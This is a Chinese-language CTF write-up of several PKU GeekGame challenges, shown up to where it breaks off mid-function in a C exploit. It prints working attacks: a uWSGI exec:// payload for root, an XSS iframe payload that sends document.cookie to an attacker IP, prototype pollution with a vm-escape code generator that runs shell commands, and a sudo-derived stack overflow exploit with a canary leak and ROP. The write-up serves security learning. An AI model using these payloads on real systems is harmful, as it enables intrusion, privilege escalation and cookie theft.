# 1st PKU Geek Game Writeups by Ruihan Li

 1. Web部分：早期人类的聊天室、Q小树洞的一大步、Flag即服务
 2. Binary部分：射水鱼、字符串转义、最强大脑

其中“字符串转义”题目的出题人是我，其他题目是比赛期间完成的，感觉都还是挺有意思的题目，所以也顺便完成了writeup。

## 早期人类的聊天室

感觉这道题目给源码和告知flag位置都挺多余的（？），属于是没什么帮助的信息。

点开chat log的查看，发现网址形如
```text
https://prob17-qmogqpmq.geekgame.pku.edu.cn/modulename=chatlog&log=chat_log_2021_11_19
```
最后的`chat_log_2021_11_19`看上去是文件名，直接假定程序没写检查，测试一个`../../../../etc/hosts`，发现是存在的
```text
https://prob17-qmogqpmq.geekgame.pku.edu.cn/module?name=chatlog&log=..%2F..%2F..%2F..%2Fetc%2Fhosts
```
接下读一读`/proc`，看看docker是怎么启动的（`/proc/1/cmdline`），发现该文件内容为：
```text
/sbin/docker-init--shrun.sh
```
找一找最后的`run.sh`（可能提供`/src`最大的好处就是这里的文件位置更好猜了？），发现`../run.sh`是存在的，读出来了docker的初始化信息：
```bash
#!/bin/sh

cd /usr/src/ufctf

cp /flagtmp /flag
echo "" > /flagtmp

chown nobody -R . \
    && chmod 0666 -R /tmp/* \
    && chown root:root /flag \
    && chmod 0600 /flag

socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 &

nginx -c /etc/nginx/nginx.conf
exec supervisord -n -c /etc/supervisor-ctf.conf
```
看到了flag的位置，但直接读取是失败的，自然是因为没有权限。再看其他配置文件，比如`/etc/supervisor-ctf.conf`：
```ini
[supervisord]
logfile=/tmp/supervisord.log ; main log file; default $CWD/supervisord.log
logfile_maxbytes=50MB        ; max main logfile bytes b4 rotation; default 50MB
logfile_backups=0           ; # of main logfile backups; 0 means none, default 10
loglevel=info                ; log level; default info; others: debug,warn,trace
pidfile=/tmp/supervisord.pid ; supervisord pidfile; default supervisord.pid
nodaemon=true               ; start in foreground if true; default false
silent=false                 ; no logs to stdout if true; default false
minfds=1024                  ; min. avail startup file descriptors; default 1024
minprocs=200                 ; min. avail process descriptors;default 200

[program:uwsgi]
command=uwsgi --ini /tmp/uwsgi-ctf.ini
user=root
autorestart=true
autostart=true
startretries=3
redirect_stderr=true
startsecs=5
stdout_logfile=/tmp/supervisor.log
stopasgroup=true
killasgroup=true
priority=999

[program:chatbot]
command=python /usr/src/ufctf/chatbot.py
user=nobody
autorestart=true
autostart=true
startretries=3
redirect_stderr=true
startsecs=5
stdout_logfile=/tmp/supervisor.log
stopasgroup=true
killasgroup=true
priority=999
```
属于是信息量比较大的一个文件，注意到：
 1. uwsgi是以root权限启动的，配置文件`/tmp/uwsgi-ctf.ini`。
 2. `/tmp/supervisor.log`保存了uwsgi的日志，之后调试简直不要太方便。
 3. uwsgi被杀掉后会自动重启。

再去看`/tmp/uwsgi-ctf.ini`，又看到：
```ini
[uwsgi]
socket = :3031
chdir = /usr/src/ufctf
manage-script-name = true
mount = /=app:app
master = true
uid = nobody
gid = nogroup
workers = 2
buffer-size = 65535
enable-threads = true
pidfile = /tmp/uwsgi.pid
```
这个权限设置就十分搞笑了，注意flask本身执行在uwsgi里，其用户是nobody，然后`/tmp`文件夹下的文件现在什么用户都能写入（`chmod 0666 -R /tmp/*`），所以我们离拿到完整的root权限只有一步之遥，即覆写`/tmp/uwsgi-ctf.ini`以删除其中的`uid = nobody`、然后干掉uwsgi让它以root权限重启。

检查下`../app.py`、`../utils.py`和`../chatbot.py`代码，没发现可以直接执行代码或是能写入文件并发送信号的漏洞，唯一感觉很奇怪的一点就是这道题允许直接连接一个内网IP然后发送任意二进制数据（即base64解码后的数据）。看上去是利用uwsgi监听的`127.0.0.1:3031`实现任意代码执行。

翻阅[uwsgi的用户手册](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html)，发现里面有一个功能`Raw Code evaluation`并且解释说`The interpreter is chosen by the modifier2. 0 is Python, 5 is Perl.`，感觉自己就要成功了，但很可惜我试验了一下发现只能得到`-- unavailable modifier requested: 22 --`的输出，翻阅了一下uwsgi的代码发现该功能的实现代码早在2011年之前就被删除了，不知道为什么十年过去了它还在文档中被记录。

我还写了脚本测试服务器上能用的所有`modifier1`，其中有几个高度疑似允许任意代码执行的比如`symcall`（C语言符号调用）、`RPC`（远程过程调用）都需要先修改配置文件才能使用，所以此路看上去不通。另一个可以注意到的时期是uwsgi[支持动态程序加载](https://uwsgi-docs.readthedocs.io/en/latest/DynamicApps.html)，但这也需要先有现成的Python脚本，似乎也很难加以利用。

最后还是依靠了万能的搜索引擎，检索`uwsgi abritary code execution`可以找到[这个](https://www.acunetix.com/vulnerabilities/web/uwsgi-unauthorized-access-vulnerability/)，竟然是动态加载应用程序时在指定程序位置的变量`UWSGI_FILE`里填入`exec://xxx`就会导致`xxx`命令被执行，确实是没有想到。感觉如果没有公开资料能独立找到这个漏洞还挺不容易的，去审计uwsgi这么一个大项目似乎远远超过了本题的应有分值（400分），不过后来看命题人发布的提示确实是贴了同一个漏洞的另一个公开链接。

那么只要利用这个漏洞把之前描述的过程实现就好了，我这里偷懒下直接在本地nginx写了个配置文件：
```nginx
location /step1 {
    root /;
    include uwsgi_params;
    uwsgi_param UWSGI_FILE "exec://sed 's/^.*id = no.*//' /tmp/uwsgi-ctf.ini > /tmp/uwsgi-ctf2.ini && cat /tmp/uwsgi-ctf2.ini > /tmp/uwsgi-ctf.ini";
    uwsgi_param SCRIPT_NAME "/step1";
    uwsgi_pass 127.0.0.1:9090;
}

location /step2 {
    root /;
    include uwsgi_params;
    uwsgi_param UWSGI_FILE "exec://kill -QUIT `cat /tmp/uwsgi.pid`";
    uwsgi_param SCRIPT_NAME "/step2";
    uwsgi_pass 127.0.0.1:9090;
}
```
然后部署一下访问网址并且在`lo`上抓包，将这里记录到的uwsgi的封包base64后贴上去发送就可以获得root权限，随后直接读取`/flag`即可。

## Q小树洞的一大步

久仰XSS的大名（当年的贴吧XSS漏洞自动转发该帖到用户所关注的所有贴吧，造成贴吧全站爆吧一个下午不知道是否还有人记得hhh），但确实没做过类似的题目，而且这个树洞的代码有点复杂，似乎不知道从何入手，所以先随便看看。

 1. 首先看了看前端和后端的交互，以及前端对后端返回的处理，感觉和本题没什么关系，而且这里后端压根没有数据库，其生成的随机文本不能控制，即使有漏洞看着也不像是能利用的样子。
 2. 然后看了看前端还有什么东西是可以配置的，比如在设置里可以调背景图片，然后在脚本里搜索`background`大致看一看能发现其实现方式是由`localStorage.hole_config`加载到`window.config`中，然后填充到网页里。又搜索了下`localStorage`发现它竟然是能通过网址访问被直接控制的，感觉有文章可做：
```js
{
    key: "on_keypress",
    value: function(e) {
        if ("Enter" === e.key) {
            var t = Ve.exec(this.state.search_text);
            if (t)
                return void (t[2] ? (localStorage[t[1]] = t[2],
                alert("Set Flag " + t[1] + "=" + t[2] + "\nYou may need to refresh this webpage.")) : (delete localStorage[t[1]],
                alert("Clear Flag " + t[1] + "\nYou may need to refresh this webpage.")));
            var n = this.state.search_text.startsWith("#") ? "single" : "search";
            this.set_mode(n, this.state.search_text || "")
        }
    }
},
```
上述代码会在搜索时触发，其中`Ve`值为`/^\/\/setflag ([a-zA-Z0-9_]+)=(.*)$/`，即通过搜索`//setflag XXX=YYY`可以控制`localStorage.XXX`为`"YYY"`。而搜索又可以通过网址访问触发（如 https://prob15-qkuhole.geekgame.pku.edu.cn/hole/#%2F%2Fsetflag%2BXXX=YYY ）。

这样可以控制背景图片、颜色模式等一系列参数，好像对于现代浏览器并没有什么用处，毕竟实在是不能指望2021年的浏览器当看到背景图片指向`javascript:XXX`时还会傻傻地执行`XXX`（可能十年前的浏览器会这样？），所以还需要继续看`localStorage`里还会存了些什么东西，然后发现了一个有意思的`localStorage.APPSWITCHER_ITEMS`，里面存了一些网站头部的标签信息（即“树洞”、“教室”、“课表”、“成绩”），它会首先在`localStorage`中加载，等500毫秒以后它会通过网址`/hole/static/appswitcher_items.json`更新，通过控制`localStorage.APPSWITCHER_ITEMS`将可以控制500毫秒网站头部标签的跳转地址（`href`，其允许javascript代码），但好像也没什么用。

但再仔细看看`APPSWITCHER_ITEMS`，发现里面有一项名字叫`fix`不知道是用来干什么的，所以搜索一下看看相关代码，发现这竟然是用`eval`来实现的hotfix功能：
```js
{
    key: "check_fix",
    value: function check_fix() {
        var _this2 = this;
        this.state.apps && this.state.apps.fix && this.state.apps.fix[this.props.appid] && setTimeout(function() {
            window.HOTFIX_CONTEXT = {
                build_info: "211007152046-GEEKGAME",
                build_env: "production"
            },
            eval(_this2.state.apps.fix[_this2.props.appid])
        }, 1)
    }
}
```
这里`_this2.state.apps.fix`即从`localStorage.APPSWITCHER_ITEMS.switch_2.fix`中加载而来，那么只要填入`window.location.href = "http://yourevilwebsite.com/" + document.cookie`就万事大吉了。

但这里还有两个比较严重的细节问题：
 1. 通过访问网址、触发搜索来设置的`localStorage.APPSWITCHER_ITEMS`无法立即生效，并且500毫秒之后就会有正确的数据将其覆盖，所以必须要在这段时间之间再触发另一访问，以使`localStorage.APPSWITCHER_ITEMS`在这次会话中发挥作用。
 2. 搜索使用`//setflag XXX=YYY`会产生消息框（即`alert()`），这会阻塞javascript代码的执行最终导致无法得到flag。

我最开始的想法是直接放两个`<iframe sandbox="allow-scripts allow-same-origin"></iframe>`，因为没有加`allow-modals`所以不能创建弹窗，可以解决第二个问题。同时两个`iframe`短时间内先后加载可以解决第一个问题，这个做法交到服务器上产生了一些意料之外的错误，随后我使用Selenium本机模拟发现原因是`iframe`内网站读取`document.cookie`会读取到空值（原因见[这里](https://web.dev/samesite-cookies-explained/)，感谢命题人@xmcp 补充），所以只能另寻它法。

最终我首先开一个`iframe`进行Q小树洞的搜索同时屏蔽弹窗，在400毫秒后直接把网站重定向到Q小树洞主页，这样被插入的`localStorage.APPSWITCHER_ITEMS`将会生效，随即达成任意javascript代码的执行。

```html
<html>
  <head>
    <script>
      setTimeout(() => { window.location.href = 'https://prob15-qkuhole.geekgame.pku.edu.cn/hole/' }, 400);
    </script>
  </head>
  <body>
    <iframe sandbox="allow-scripts allow-same-origin" src="https://prob15-qkuhole.geekgame.pku.edu.cn/hole/#%2F%2Fsetflag%20APPSWITCHER_ITEMS={%22switcher_2%22:{%22bar%22:[],%22dropdown%22:[],%22fix%22:{%22hole%22:%22window.location.href=%5C%22http://10.1.X.Y:8000/flag/%5C%22+encodeURIComponent(document.cookie)%22}}}">
    </iframe>
  </body>
</html>
```

## Flag即服务

第一步和“早期人类的聊天室”相似，实际上我还是先完成的这道题，这道题给出的错误提示丰富一些，所以很好发现，比如访问`https://prob11-s76fiqdc.geekgame.pku.edu.cn/api/..%2F`会得到：
```text
Error: EISDIR: illegal operation on a directory, read
    at Object.readSync (fs.js:617:3)
    at tryReadSync (fs.js:382:20)
    at Object.readFileSync (fs.js:419:19)
    at /usr/src/app/node_modules/jsonaas-backend/index.js:56:19
    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
    at /usr/src/app/node_modules/express/lib/router/index.js:281:22
    at param (/usr/src/app/node_modules/express/lib/router/index.js:354:14)
```

显然服务器在用node.js，所以读取`../package.json`（恰好这是个json文件，所以服务端代码将正常工作并且得到期望的输出）即得源代码（及源代码中包含的flag0）：
```json
{"name":"demo-server","version":"1.0.0","description":"","scripts":{"start":"node --max-http-header-size=32768 start.js"},"author":"You","license":"WTFPL","dependencies":{"jsonaas-backend":"https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz"}}
```

得到源码之后看看原理，首先对premium版本的检测是依靠`express-session`，这是一个数据保存在服务器的session实现，所以能在客户端直接对cookie动手脚的概率不是很大。另外在处理`in_path`和`out_path`时看到了一些奇怪的参数检查，这个像是在避免javascript的经典攻击prototype pollution，但这个代码长得就不像是一个完备检查，大概率可以绕过。

仔细看一遍发现`/api/:path(*)`这个路由上完全没有检查输入类型，如果输入`out_path`是一个数组，那么第35行在函数`waf(str)`里`str.indexOf`会检查数组中有无恰好相等的元素，而第89行`out_path = prefix + out_path`会直接把`out_path`转化为字符串（因为`prefix`是字符串），进而导致出现之前没检查出来的字符串子串。

所以构造输入以覆写`Object.prototype.activated`为某个object`X`（其中`Object`可以用`({}).constructor`得到），这样访问`activated`将从默认`undefined`变为默认`X`，访问`/activate`就可以得到flag1了：
```js
if(req.session.activated)
    res.send(`You have been activated. Activation code: ${FLAG1}`);
else
    res.send('Wrong activation code :(');
```

翻看express.js默认用来解析URL参数的库qs，发现它确实支持输入一个数组，语法为`A[0]=B&A[1]=C&...`，因此构造输入使得`out_path`取值为`['constructor/prototype/activated']`即可：
```text
https://prob11-s76fiqdc.geekgame.pku.edu.cn/api/demo.json?out_path[0]=constructor%2Fprototype%2Factivated
```

回头看了一下发现代码里有一些奇怪的暗示，比如：
 1. 只有在输出flag时用了`if(req.session.activated)`这个判断，其他时候都是`if(req.session.activated!==1)`。
 2. 处理`out_path`的循环里写了
    ```js
    if(cur[term]===undefined)
        cur[term] = {};
    cur = cur[term];
    ```
    这看上去就十分诡异，因为正常人写这段代码不会认为`cur[term]`有可能不是`undefined`，那么他只会这么写：
    ```js
    cur[term] = {};
    cur = cur[term];
    ```
    （不过硬要解释可以理解为这段代码是从上面处理`in_path`的代码段里偷懒复制下来的，也不是说不通。）

用得到的flag可以激活premium版本并开启eval功能，要得到flag2，第一步应该挺明确的，即通过这个eval来进行远程代码执行。
 1. 使用node.js的`vm`模块是没有用处的，官方文档明确说了`The vm module is not a security mechanism. Do not use it to run untrusted code.`，一个众所周知的逃逸方法是`this.constructor.constructor('const fs = require("fs"); /* ... */')`。
 2. 但这里限制了代码能使用的字符集，被eval的代码里不能含有英文字母、单双引号、逗号、分号：
     1. 限制逗号、分号原则上不会造成任何问题，将`a=1;b=2;c=a+b;`用`(a=1)+(b=2)+(c=a+b)`代替即可。
     2. 限制单双引号原则上不会造成任何问题，使用``` `abc` ```代替`"abc"`即可。
     3. 限制英文字母就比较麻烦了，不过如果可以找到办法拼出所有英文字母，假定`_1`变量存储了`"abc"`，用`_0[_1]`代替`_0.abc`可以解决问题。

我拼英文字母的最终目标是找到`String`和`fromCharCode`，这样通过函数`String.fromCharCode`就可以得到任意英文字母了。
  1. 首先通过``` ``+[][0] ```、``` ``+!0 ```、``` ``+!!0 ```、``` ``+2**10000 ```分别得到`undefined`、`true`、`false`、`Infinity`。
  2. 拼出`find`，用``` ``+[]['find'] ```得到`function find() { [native code] }`。
  3. 拼出`constructor`，用``` ``+(0)['constructor'] ```和``` ``+``['constructor'] ```分别得到`function Number() { [native code] }`和`function String() { [native code] }`。
  4. 还剩下两个字母`h`和`C`，这两个不是很直接：
     1. 得到`h`：逃逸`vm`后执行函数```for($ in module){if($[2]==`t`)return $}```可以得到`path`或`paths`（具体哪一个依赖于node.js版本），注意用于构造此函数的所有字符都已经出现过。（构造函数使用`({}).constructor.constructor`即可，这是一个`vm`外的`Function`类型，所以也完成了`vm`逃逸。）
     2. 得到`C`：执行函数```try{[][][0]}catch($){return $.toString()}```可以得到一个以`TypeError: Cannot read propert`开头的字符串（具体是什么依赖于node.js版本），同样所有用于构造此函数的字符已经出现过。

于是拥有`String.fromCharCode`并利用它进一步拥有所有字符后就可以随意执行代码了，比如利用`require('child_process')`执行任意shell命令，把结果通过`require('fs')`写入`readme.html`以供查看。

似乎服务器限制了URL字符数量不能超过某个略大于3000的值，所以写完代码很可能需要先优化一下，否则大概率因为超出长度限制而失败，方法如尽量使用短的变量名（例如`$`）和不需要转义的字符（例如尽量用`-`代替`+`，因为传递`+`必须使用`%2B`而`-`可以直接传递）等。

经过如此繁琐的编码过程，我以为我这道题肯定做完了，结果…… 使用和“早期人类的聊天室”类似的方法，通过读取`/proc/1/cmdline`发现并进一步读取`/usr/src/app/run.sh`得到docker的初始化过程后，发现服务器上所有的flag都被删除或覆盖了：
```bash
cp /flag0.txt /usr/src/app/flag0.txt
cp /flag1.txt /usr/src/app/flag1.txt
cp /flag2.txt /usr/src/app/flag2.txt

echo "flag{Fake-Flag-Json-0aaa}" > /flag0.txt
echo "flag{Fake-Flag-Json-0asd}" > /flag1.txt
echo "flag{Fake-Flag-Json-0abc}" > /flag2.txt
```
另外在`getflag.js`中，函数`getflag`读出flag后顺便删除了flag文件：
```fs
let content = fs.readFileSync(f, {encoding: 'utf-8'}).trim();
fs.unlinkSync(path);
```

于是问题就陷入了困境，我只好随机在文件系统内游走看看有没有什么有用的信息，其中特别关注了一下`/proc`，结果突然发现在对应`node`进程的`/proc/33/fd/20`里竟然可以找到flag，看上去是因为js中的文件对象即使没人引用了不会及时销毁（感觉这个垃圾回收策略十分垃圾啊？），导致文件描述符未被关闭，这样即便删除文件，内核因为此文件引用计数不为零所以不会真正将其删除。

感谢命题人@xmcp 补充：这里`getflag`中是故意没有关闭文件描述符`f`，因为node.js中`f`就是一个整型文件描述符，不是一个文件对象，所以这个文件不会被关闭，和垃圾回收策略没有关系。
```js
function getflag(path) {
    let f;
    try {
        f = fs.openSync(path);
    } catch(e) {
        //return 'failed';
        throw e;
    }
    let content = fs.readFileSync(f, {encoding: 'utf-8'}).trim();
    fs.unlinkSync(path);
    return content;
}
```

最后贴一下用于生成符合字符要求的、可以任意执行远程命令的eval代码的Python脚本：
```python
chars = {}

def register_string(i, s):
    for j, c in enumerate(s):
        if c in chars:
            continue
        chars[c] = f'${i}[{j}]'

result = ''

register_string(0, 'undefined')
result += '($0=``+[][0])-'

register_string(1, 'true')
result += '($1=``+!0)-'

register_string(2, 'false')
result += '($2=``+!!0)-'

register_string(3, 'Infinity')
result += '($3=``+2**10000)-'

register_string(4, 'function find() { [native code] }')
result += '($4=``+[][$2[0]+$3[3]+$3[4]+$0[8]])-'

register_string(5, 'constructor')
result += '($5=$4[26]+$4[27]+$0[1]+$2[3]+$1[0]+$1[1]+$1[2]+$4[26]+$1[0]+$4[27]+$1[1])-'

register_string(17, 'function Number() { [native code] }')
result += '($17=``+(0)[$5])-'

register_string(6, 'function String() { [native code] }')
result += '($6=``+``[$5])-'

register_string(7, 'String')
result += '($7=$6[9]+$6[10]+$6[11]+$6[12]+$6[13]+$6[14])-'

register_string(8, 'toString')
result += '($8=$1[0]+$4[27]+$7)-'

register_string(9, 'return')
result += '($9=$1[1]+$1[3]+$1[0]+$1[2]+$1[1]+$0[1])-'

register_string(10, 'module')
result += '($10=$17[11]+$8[1]+$0[2]+$0[0]+$2[2]+$0[3])-'

register_string(11, 'for')
result += '($11=$0[4]+$5[1]+$1[1])-'

register_string(12, 'in')
result += '($12=$3[3]+$3[4])-'

register_string(13, 'path')
result += '($13={}[$5][$5](`${$9} ${$5}.${$5}(\\`${$11}($ ${$12} ${$10}){${$3[3]}${$3[2]}($[2]==\\\\\\`${$8[0]}\\\\\\`)${$9} $}\\`)()`)())-'

register_string(14, 'try')
result += '($14=$1[0]+$1[1]+$3[7])-'

register_string(15, 'catch')
result += '($15=$5[0]+$2[1]+$1[0]+$5[0]+$13[3])-'

register_string(16, "TypeError: Cannot read propert")
result += '($16={}[$5][$5](`${$14}{[][0][0]}${$15}($){${$9} $.${$8}()}`)())-'

register_string(18, 'fromCharCode')
result += '($18=$2[0]+$1[1]+$5[1]+$17[11]+$16[11]+$15[4]+$2[1]+$1[1]+$16[11]+$5[1]+$0[2]+$0[3])-'

result += '($={}[$5][$5](`${$9} ${$7}.${$18}`)())-'

counter = 19
def solve_char(c):
    global result
    global counter
    if c in chars:
        return chars[c]
    cc = c
    c = ord(c)
    result += f'(${counter}=$({c}))-'
    chars[cc] = f'${counter}[0]'
    counter += 1
    return chars[cc]

def solve_string(s_in):
    global result
    global counter
    s_out = ''
    for c in s_in:
        s_out += solve_char(c) + '+'
    s_out = s_out[:-1]
    result += f'(${counter}={s_out})-'
    counter += 1
    return f'${counter-1}'

code = solve_string('const n=require;const{spawn:o}=n("child_process");const s=o("cat",["/proc/33/fd/20"]);let t="";s.stdout.on("data",n=>{t+=n});s.on("close",o=>{const s=n("fs");s.writeFile("readme.html",t,()=>{})})')
#code = solve_string('const n=require;const s=n("fs");s.writeFile("/usr/src/app/data/pwn.json","\'\'",()=>{})')
result += '{}[$5][$5](`${$5}.${$5}(\\`${' + code + '}\\`)()`)()'

result = '(' + result + ')'
print(result)
print(result.replace('+', "%2B").replace('==', '%3D='))
```

这里其实产生的字符串中明显还有很多冗余，其长度可以进一步压缩，但因为已经够用了就没有进一步修改代码。

## 射水鱼

直接带调试信息编译一下看看gdb有什么输出
```text
linux@linux ~/test/7 % gcc hello.c -o hello -g
linux@linux ~/test/7 % gdb -q ./hello
Reading symbols from ./hello...
(gdb) b main
Breakpoint 1 at 0x111d: file hello.c, line 5.
(gdb) r
Starting program: /home/linux/test/7/hello

Breakpoint 1, main () at hello.c:5
5	    return 0;
(gdb) c
Continuing.
[Inferior 1 (process 184732) exited normally]
(gdb) q
```
可以直接发现在断点处hello.c会被直接读取以显示代码，那么如果`hello.c:5`可以被换成`/flag:1`，将直接得到flag。

这里我给出一个也许是最简单的，几乎不需要了解DWARF调试信息结构、且完全不需要手动编辑二进制文件的做法。首先为了避免不必要的麻烦，看一看给出的ELF文件`hello`是被什么编译器编译的：
```text
linux@linux ~/test/7/prob14 % strings hello | grep GCC
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
```
然后拉一个Ubuntu 20.04的docker镜像回来并且安装gcc-9，发现gcc的版本号完全一致，同时编译`hello.c`试试发现可以产生相同的汇编代码（指`objdump -S`输出一模一样）。下一步是让源文件为`/flag`，所以直接在`/flag`里填写一行C代码：
```c
int a = 0; int main() { return 0; }
```
然后直接用GCC编译`/flag`。如果没有额外添加参数，GCC会因为不知道`/flag`里是什么语言而拒绝编译，但不是什么大问题，用参数指明就好：
```text
root@50afc0b3ae1f:/# gcc -x c -g /flag -o hello
```
接下来按[GDB官方文档](https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html)的指示生成独立的debug文件：
```text
root@50afc0b3ae1f:/# objcopy --add-gnu-debuglink=hello.debug hello
```
但发现这不能正常工作，因为GDB会抱怨`hello.debug`的CRC32校验不正确，但只需要随意找一个工具（比如[这个](https://www.nayuki.io/page/forcing-a-files-crc-to-any-value)），通过修改`hello.debug`的最后四个字节将其CRC32校验值魔改为正确的即可。可能唯一需要的一点点调试信息的知识是学会如何查看`hello`中`.gnu_debuglink`节保存的`hello.debug`期望CRC32校验值：
```text
linux@linux ~/test/7/prob14 % objdump --dwarf=links ./hello

./hello:     file format elf64-x86-64

Contents of the .gnu_debuglink section:

  Separate debug info file: hello.debug
  CRC value: 0x6751fc53
```
然后本地跑一下发现已经可以拿到flag了，不过由于`hello.debug`文件大小太大无法传到服务器上。

于是打开`hello.debug`看看里面都有什么，发现里面对34个节的描述（section headers）占了文件总大小的三分之二，而文件大小（0x17a0）实际上也没超过题目对文件大小的要求（0x1024）多少。这里面大多数对节的描述是和`hello`中对节的描述一模一样的，纯属冗余，特别是很多节比如`.interp`、`.note.*`在`hello.debug`中完全无用（只需若干`.debug_*`的节就足够了），所以不妨试试把它们删除一部分，比如：
```bash
objcopy -R "*.gnu.*" -R ".interp" -R ".note.*" backup.debug hello.debug
```
（尽管我这里额外手动编辑ELF文件先把用于加载程序的program headers干掉了，不过这不太必要，删除部分无用section就足以达到目标了。）

发现现在`hello.debug`已经比要求大小（0x1024）还小了，可以在文件最后补一些随机数据然后重新修复CRC32，交到服务器上就可以打出flag了。

## 字符串转义

题面所说的工具是众所周知的sudo，是的你没有听错就是你可能天天使用的sudo，而且这个漏洞存在了近十年（2011.7~2021.1），这个漏洞的直接影响是不需要任何特殊的sudo配置文件，几乎只要用户能执行sudo（显然，不是说用户真的需要具有让sudo执行成功的资格）就能拿到root权限。对这个漏洞本身的分析可以参考[这个博客](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)，另外[这个GitHub仓库](https://github.com/worawit/CVE-2021-3156)包含了一个比较全的PoC程序集合。

不太清楚是否有选手觉得这个程序的行为十分刻意，但至少其中最关键的一段代码
```c
while (*from)
{
  if (from[0] == '\\' && !isspace(from[1]))
    ++from;
  *to++ = *from++;
}
```
是完全从sudo里[抄过来的](https://github.com/sudo-project/sudo/blob/741cf082a358120dcbbe1005bd794bad157e4e10/plugins/sudoers/sudoers.c#L971-L975)，当时sudo需要很有技巧地传递一些命令行参数才能使得`from`完全处于用户输入的控制之下（这也应该是为什么这个看上去没有那么复杂的漏洞会存在十年之久的一个重要原因），这里省略了这个流程。另外sudo中`from`和`to`都是堆地址，不过~~因为能力有限感觉出堆缓冲区溢出的题目有点困难，~~ 这里改成了栈缓冲区溢出。

本题的基本思路是注意到`isspace('\0')`会得到`false`，所以说如果如果输入字符串`from`以`'\\'`字符结尾，那么会导致其结尾的`\0`被跳过，`while`循环继续执行，这就有可能造成栈上的缓冲区溢出，而紧随`to`之后的是金丝雀值和函数返回地址，所以还需要想办法泄漏原有的金丝雀值以及函数返回地址。下面详细讨论这两个行为如何实现：
  1. 关于缓冲区溢出后值的任意覆写：栈上从低地址到高地址排列了128字节的`from`（即`ctx.input`）、`to`（即`ctx.escaped`），目标是在`to`结尾后的若干字节内填入任意数值。
     1. 首先整个`from`指向的128字节可以填入不含`'\n'`和`'\0'`的任何二进制数据，首先该数据因为不含`'\n'`所以可以在`getline(&buffer, &n, stdin)`中顺利读入，在这段数据后插入`\0`使得`m = strlen(buffer)`恰好为128可以跳过`m > sizeof(ctx.input)`导致`Input string is too long`的检查，随后`strcpy(ctx.input, buffer)`会将该段数据拷贝到`from`指向的地址。
     2. 想要在`from`内填入不含`'\n'`但包含`'\0'`的二进制数据，可以通过多次输入来实现，简单来说如果第一次输入`zzzyyy`、第二次输入`xx`，那么就可以在`from`中填入`"xx\0yyy"`。
     3. 进一步可以发现当`from`被输入完全控制时，`to`也被输入所控制，即`from`中的字符串通过转义被填入了`to`中。
     4. 通过在`from`中写入`'\0'`前总是用额外的`'\\'`转义，可以使得控制流出现对`ctx.input`数组的越界访问，后果是进一步转义`ctx.escaped`数组（即本来的`to`），紧接着`ctx.escaped`数组被写满越界，那么转义的结果会被写入其后的金丝雀值和函数返回地址中，注意除了`'\n'`字符外转义的结果允许任意二进制数据出现，特别是包含了`'\0'`，这足够我们利用了。
  2. 关于金丝雀值和函数返回值的泄漏：需要先泄漏金丝雀值才能覆写，对于PIE程序需要先泄漏某个函数地址才能覆写函数返回地址。
     1. 这里的泄漏方法可能算是有点技巧的，需要想到`from`指针不一定总能在`to`指针之前，例如当输入128个`'\\'`字符组成的字符串时，`ctx.escaped`数组会被填入127个`'\\'`字符，随后`from`指针和`to`指针在`ctx.escaped`的最后一个字符处汇合，只要我们通过之前的办法在`ctx.escaped`数组结束后的某个位置覆写字符`'\\'`，会导致处理该字符后`from`指针指向`to`指针的后一个位置，那么这等价于之后的数据会向栈低地址处移动。
     2. 再注意到紧随`ctx.escaped`之后的其实还有个不起眼的`ctx.id`，只要把金丝雀值或函数返回地址移动到`ctx.id`处，它就会在每轮循环打印`Case #%d:`时被打印出来，从而完成其值的泄漏。

最后剩下的就是一个比较简单的ROP了，因为`getflag`函数期望输入是字符串`"./.flag"`，所以需要填充第一个参数的地址，这里因为上述过程也顺便泄漏了`%rbp`，所以把这个字符串放在栈里，利用常用做ROP的经典函数`__libc_csu_init`的最后两个字节`5f c3`（即`popq %rdi; retq`）就可以完成任务。

exploit程序（完整构建环境请参考[这里](sol/escape)）：
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/wait.h>
#include "const.h"

struct context
{
  FILE *rfile;
  FILE *wfile;
  char *buf;
  size_t bufsz;
  uint32_t ncase;
};

static int request_and_send_token(FILE *rfile, FILE *wfile)
{
  char buf[128] = "Please input your token: ";
  char *s = buf;

  while (*s && (*s == fgetc(rfile)))
    ++s;
  if (*s) {
    *s = '\0';
    fprintf(stderr, "Unexpected token prompt after \"%s\"\n", buf);
    return -1;
  }
  fputs(buf, stdout);
  fflush(stdout);

  if (fgets(buf, sizeof(buf), stdin) <= 0) {
    fprintf(stderr, "Failed to get your token\n");
    return -1;
  }
  if (fputs(buf, wfile) < 0 || fflush(wfile) < 0) {
    fprintf(stderr, "Failed to write your token\n");
    return -1;
  }

  return 0;
}

static int expect_and_read_welcome(struct context *ctx)
{
  if (getline(&ctx->buf, &ctx->bufsz, ctx->rfile) <= 0 ||
      strncmp(ctx->buf, "Welcome, ", 9) != 0) {
    fputs("no welcome message found\n", stderr);
    return -1;
  }

  return 0;
}

static int expect_and_read_case(struct context *ctx)
{
  if (getline(&ctx->buf, &ctx->bufsz, ctx->rfile) <= 0 ||
      sscanf(ctx->buf, "Case #%u:", &ctx->ncase) != 1) {
    fputs("no case message found\n", stderr);
    return -1;
  }

  return 0;
}

static int
write_line_alone(struct context *ctx, const char *msg, size_t size)
{
  if (size != 128) {
    fputs("write line size unexpected\n", stderr);
    return -1;
  }

  if (fwrite(msg, size, 1, ctx->wfile) <= 0
      || fputc('\0', ctx->wfile) < 0
      || fputc('\n', ctx->wfile) < 0
      || fflush(ctx->wfile) < 0) {
    fputs("write line failed\n", stderr);
    return -1;
  }

  return 0;
}

static int
write_line_and_update(struct context *ctx, const char *msg, size_t size)
{
  if (write_line_alone(ctx, msg, size) < 0)
    return -1;

